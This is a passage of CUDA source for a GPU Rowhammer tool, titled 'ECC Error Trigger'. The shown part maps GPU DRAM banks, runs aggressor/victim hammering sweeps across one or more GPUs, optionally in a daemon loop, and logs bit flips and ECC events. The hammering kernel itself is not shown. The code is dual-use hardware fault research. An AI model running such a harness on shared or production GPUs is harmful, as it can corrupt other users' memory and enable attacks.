                    if (voff + 256 > mem_sz) continue;

                    CUDA_CHECK(cudaMemcpy(buf, d_mem + voff, 256,
                                          cudaMemcpyDeviceToHost));
                    for (int b = 0; b < 256; b++) {
                        if (buf[b] != victim_pat) {
                            stats.bitflips++;
                            log.log(gpu, "  !!!! BIT FLIP !!!!\n");
                            log.log(gpu, "  Bank %d  victim row %d\n",
                                    bi, vi);
                            log.log(gpu, "  Offset: 0x%lx  byte: %d\n",
                                    (unsigned long)(voff+b), b);
                            log.log(gpu, "  Value: 0x%02X -> 0x%02X  XOR: 0x%02X\n",
                                    victim_pat, buf[b],
                                    victim_pat ^ buf[b]);
                            CUDA_CHECK(cudaMemset(d_mem + voff,
                                                  victim_pat, 256));
                            break;
                        }
                    }
                }
            }

            for (int i = 0; i < n_sided; i++)
                CUDA_CHECK(cudaMemset(d_mem + agg_offs[i], victim_pat, 256));

            if (!verbose && tested % 100 == 0) {
                log.log(gpu, "  Bank %d: %d/%d pos (ECC:%d flips:%d)\n",
                        bi, tested, limit,
                        stats.ecc_events.load(), stats.bitflips.load());
            }
            if (verbose)
                log.log(gpu, "  [bank%d pos%d] done\n", bi, pos);
        }
        log.log(gpu, "\n");
    }

    ECCSnap eccF = ecc.snap();
    log.log(gpu, "  Campaign done – %d positions\n", positions_total);
    log_ecc_diff(log, gpu, ecc0, eccF);
}

// ===================================================================
// Per-GPU Worker
// ===================================================================

struct GPUResult {
    int gpu_id;
    std::string gpu_name;
    std::string mem_type;
    int ecc_events = 0;
    int bitflips   = 0;
    int runs       = 0;
};

static void gpu_worker(int gpu_id, const Config &cfg,
                       Logger &log, GPUResult &result) {
    CUDA_CHECK(cudaSetDevice(gpu_id));

    cudaDeviceProp prop;
    CUDA_CHECK(cudaGetDeviceProperties(&prop, gpu_id));
    size_t free_mem, total_mem;
    CUDA_CHECK(cudaMemGetInfo(&free_mem, &total_mem));

    result.gpu_id = gpu_id;
    result.gpu_name = prop.name;

    log.log(gpu_id, "========================================\n");
    log.log(gpu_id, "%s\n", prop.name);
    log.log(gpu_id, "  Compute: sm_%d%d  SMs: %d\n",
            prop.major, prop.minor, prop.multiProcessorCount);
    log.log(gpu_id, "  Memory:  %.1f GB total, %.1f GB free\n",
            total_mem / 1e9, free_mem / 1e9);
    log.log(gpu_id, "  ECC:     %s\n",
            prop.ECCEnabled ? "ENABLED" : "DISABLED");

    if (prop.major < 8) {
        log.log(gpu_id, "  SKIP: sm_80+ required for discard\n");
        return;
    }

    MemoryProfile mp = detect_memory_profile(prop);
    result.mem_type = mp.type_name;
    print_memory_profile(mp, log, gpu_id);

    if (!prop.ECCEnabled) {
        log.log(gpu_id, "  WARNING: ECC OFF. Enable: "
                "nvidia-smi --ecc-config=1 -i %d\n", gpu_id);
    }

    // Resolve auto parameters from profile
    int sync_delay = cfg.sync_delay > 0 ? cfg.sync_delay : mp.sync_delay;
    int rounds     = cfg.rounds > 0     ? cfg.rounds     : mp.default_rounds;
    int num_banks  = cfg.num_banks > 0  ? cfg.num_banks  : mp.default_banks_to_test;

    log.log(gpu_id, "  Tuned: sync_delay=%d rounds=%d banks=%d\n",
            sync_delay, rounds, num_banks);

    // ECC monitor
    ECCMon ecc;
    if (ecc.init(gpu_id)) {
        ECCSnap s0 = ecc.snap();
        log.log(gpu_id, "  Initial ECC:\n");
        log_ecc(log, gpu_id, s0);
    } else {
        log.log(gpu_id, "  ECC monitoring unavailable\n");
    }

    // Allocate memory
    size_t reserve = cfg.reserve_mb << 20;
    size_t alloc_sz = (free_mem > reserve) ? free_mem - reserve : free_mem / 2;
    alloc_sz = (alloc_sz / 4096) * 4096;

    log.log(gpu_id, "  Allocating %.2f GB...\n", alloc_sz / 1e9);
    uint8_t *d_mem = nullptr;
    while (alloc_sz > (1ULL << 30)) {
        cudaError_t e = cudaMalloc(&d_mem, alloc_sz);
        if (e == cudaSuccess) break;
        alloc_sz -= (64ULL << 20);
        d_mem = nullptr;
    }
    if (!d_mem) {
        log.log(gpu_id, "  FAIL: cudaMalloc\n");
        return;
    }
    log.log(gpu_id, "  Allocated %.2f GB\n", alloc_sz / 1e9);

    // Bank mapping
    log.log(gpu_id, "--- Bank Mapping ---\n");
    std::vector<BankMap> banks;

    if (cfg.stride > 0) {
        log.log(gpu_id, "  Manual stride: %zu\n", cfg.stride);
        banks = build_banks_stride(d_mem, alloc_sz, cfg.stride,
                                   num_banks, mp, log, gpu_id, cfg.verbose);
    } else {
        log.log(gpu_id, "  Auto-detecting stride (hint: %zu)...\n",
                mp.stride_hint);
        size_t stride = detect_stride(d_mem, alloc_sz, mp,
                                      cfg.scan_samples,
                                      log, gpu_id, cfg.verbose);
        if (stride > 0) {
            log.log(gpu_id, "  Detected stride: %zu\n", stride);
            banks = build_banks_stride(d_mem, alloc_sz, stride,
                                       num_banks, mp,
                                       log, gpu_id, cfg.verbose);
        } else {
            log.log(gpu_id, "  Stride inconclusive – timing scan...\n");
            banks = build_banks_timing(d_mem, alloc_sz, num_banks, mp,
                                       cfg.scan_samples,
                                       log, gpu_id, cfg.verbose);
        }
    }

    log.log(gpu_id, "  Banks mapped: %zu\n", banks.size());
    for (int i = 0; i < (int)banks.size(); i++) {
        const BankMap &bk = banks[i];
        if (bk.stack_id >= 0)
            log.log(gpu_id, "    [%d] rows=%zu stack=%d ch=%d\n",
                    i, bk.rows.size(), bk.stack_id, bk.channel_id);
        else
            log.log(gpu_id, "    [%d] rows=%zu\n", i, bk.rows.size());
    }

    bool any_usable = false;
    for (auto &bk : banks)
        if ((int)bk.rows.size() >= cfg.n_sided * cfg.distance)
            any_usable = true;
    if (!any_usable) {
        log.log(gpu_id, "  No bank has enough rows. Skipping.\n");
        CUDA_CHECK(cudaFree(d_mem));
        return;
    }

    // Campaign
    CampaignStats stats;

    auto do_run = [&](int ns, int dist, uint8_t vp, uint8_t ap,
                      const char *label) {
        int k = cfg.k_warps;
        int m = ns / k;
        if (ns % k != 0) { m++; ns = k * m; }
        if (label)
            log.log(gpu_id, ">>>>> Sweep: %s <<<<<\n", label);
        run_campaign(d_mem, alloc_sz, banks, mp,
                     ns, dist, vp, ap,
                     k, m, rounds, sync_delay,
                     cfg.duration_ms, cfg.max_iters,
                     cfg.verbose, ecc, stats, log, gpu_id);
    };

    if (cfg.daemon) {
        log.log(gpu_id, "*** DAEMON MODE ***\n");
        while (!g_stop) {
            result.runs++;
            log.log(gpu_id, "\n===== RUN %d =====\n", result.runs);
            double t0 = now_sec();

            if (cfg.sweep) {
                for (int si = 0; si < SWEEP_COUNT && !g_stop; si++)
                    do_run(SWEEP_TABLE[si].n_sided,
                           SWEEP_TABLE[si].distance,
                           SWEEP_TABLE[si].victim,
                           SWEEP_TABLE[si].aggressor,
                           SWEEP_TABLE[si].label);
            } else {
                do_run(cfg.n_sided, cfg.distance,
                       cfg.victim, cfg.aggressor, nullptr);
            }

            double elapsed = now_sec() - t0;
            log.log(gpu_id, "Run %d done in %.1f s\n",
                    result.runs, elapsed);
            log.log(gpu_id, "  ECC events: %d  Bit flips: %d\n",
                    stats.ecc_events.load(), stats.bitflips.load());

            if (stats.ecc_events > 0 || stats.bitflips > 0) {
                log.log(gpu_id, "*** ERRORS FOUND ***\n");
                log.log(gpu_id, "Re-running for reproducibility...\n");
                ECCSnap es = ecc.snap();
                log_ecc(log, gpu_id, es);
            }

            if (g_stop) break;
            log.log(gpu_id, "Cooldown %d s...\n", cfg.cooldown);
            for (int i = 0; i < cfg.cooldown && !g_stop; i++) sleep(1);
        }
    } else {
        result.runs = 1;
        if (cfg.sweep) {
            for (int si = 0; si < SWEEP_COUNT && !g_stop; si++)
                do_run(SWEEP_TABLE[si].n_sided,
                       SWEEP_TABLE[si].distance,
                       SWEEP_TABLE[si].victim,
                       SWEEP_TABLE[si].aggressor,
                       SWEEP_TABLE[si].label);
        } else {
            do_run(cfg.n_sided, cfg.distance,
                   cfg.victim, cfg.aggressor, nullptr);
        }
    }

    result.ecc_events = stats.ecc_events;
    result.bitflips   = stats.bitflips;

    if (ecc.ready) {
        ECCSnap sf = ecc.snap();
        log.log(gpu_id, "Final ECC:\n");
        log_ecc(log, gpu_id, sf);
    }

    CUDA_CHECK(cudaFree(d_mem));
}

// ===================================================================
// Main
// ===================================================================

int main(int argc, char **argv) {
    Config cfg = parse_args(argc, argv);

    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);

    Logger log;
    if (!log.open(cfg.log_path.c_str())) {
        fprintf(stderr, "Warning: cannot open log file %s\n",
                cfg.log_path.c_str());
    }

    log.log(-1, "==========================================================\n");
    log.log(-1, " GPU Rowhammer – ECC Error Trigger\n");
    log.log(-1, " Log: %s\n", cfg.log_path.c_str());
    log.log(-1, "==========================================================\n");

    // Global NVML init (once, before threads)
    nvmlReturn_t nvml_ret = nvmlInit_v2();
    if (nvml_ret != NVML_SUCCESS)
        log.log(-1, "Warning: NVML init failed: %s\n",
                nvmlErrorString(nvml_ret));

    int dev_count;
    CUDA_CHECK(cudaGetDeviceCount(&dev_count));
    log.log(-1, "GPUs detected: %d\n\n", dev_count);

    // Resolve GPU list
    if (cfg.all_gpus || cfg.gpus.empty()) {
        cfg.gpus.clear();
        for (int i = 0; i < dev_count; i++)
            cfg.gpus.push_back(i);
    }
    for (int g : cfg.gpus) {
        if (g >= dev_count) {
            fprintf(stderr, "GPU %d not found (%d available)\n",
                    g, dev_count);
            nvmlShutdown();
            return 1;
        }
    }

    // Launch one worker thread per GPU
    std::vector<GPUResult> results(cfg.gpus.size());
    std::vector<std::thread> threads;

    if (cfg.gpus.size() == 1) {
        gpu_worker(cfg.gpus[0], cfg, log, results[0]);
    } else {
        log.log(-1, "Launching %zu GPU workers in parallel...\n\n",
                cfg.gpus.size());
        for (size_t i = 0; i < cfg.gpus.size(); i++) {
            threads.emplace_back(gpu_worker, cfg.gpus[i],
                                 std::cref(cfg), std::ref(log),
                                 std::ref(results[i]));
        }
        for (auto &t : threads)
            t.join();
    }

    // Final summary
    log.log(-1, "\n==========================================================\n");
    log.log(-1, " FINAL REPORT\n");
    log.log(-1, "==========================================================\n");

    int total_ecc = 0, total_flips = 0;
    for (auto &r : results) {
        log.log(-1, "  GPU %d: %s [%s]\n",
                r.gpu_id, r.gpu_name.c_str(), r.mem_type.c_str());
        log.log(-1, "    Runs: %d  ECC events: %d  Bit flips: %d\n",
                r.runs, r.ecc_events, r.bitflips);
        total_ecc  += r.ecc_events;
        total_flips += r.bitflips;
    }
    log.log(-1, "  ──────────────────────────────────\n");
    log.log(-1, "  Total: ECC=%d  Bit flips=%d\n", total_ecc, total_flips);
    log.log(-1, "==========================================================\n");

    nvmlShutdown();
    log.close();

    return (total_ecc > 0 || total_flips > 0) ? 0 : 1;
}
